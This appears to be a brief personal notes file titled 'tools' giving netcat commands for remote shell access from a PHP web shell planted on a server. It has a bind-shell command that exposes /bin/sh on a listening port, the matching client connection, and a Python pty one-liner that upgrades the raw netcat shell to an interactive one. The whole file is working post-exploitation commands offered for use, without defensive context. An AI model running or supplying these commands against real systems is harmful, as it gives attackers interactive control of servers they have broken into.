# tools

Connecting your local shell with a php shell via netcat:

On PHP Shell (where 31337 is any port you choose):
nc -lp 31337 -e /bin/sh

On your Shell (where domain is either the .com or the IP):
nc domain 31337

Turn a netcat shell into a real-looking shell
python -c "import pty; pty.spawn('/bin/bash');"